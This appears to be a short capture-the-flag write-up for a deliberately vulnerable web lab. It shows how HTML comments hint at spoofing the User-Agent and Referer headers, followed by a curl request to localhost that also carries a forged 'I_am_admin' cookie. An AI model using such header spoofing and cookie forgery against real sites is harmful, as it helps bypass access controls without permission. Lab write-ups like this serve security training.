# Exploit
We visit the url "/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c" (link in bottom of main page). We check the source code of the page and we can see the following comments : 
1. "You must cumming from : "https://www.nsa.gov/" to go to the next step"
2. "Let's use this browser : "ft_bornToSec". It will help you a lot."

We deduce these comments refer to the "user agent" and "referer" send in the http headers.
So we send this http headers:
#  curl 'http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' -H 'User-Agent: ft_bornToSec' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' --compressed -H 'Referer: https://www.nsa.gov/' -H 'Connection: keep-alive' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327'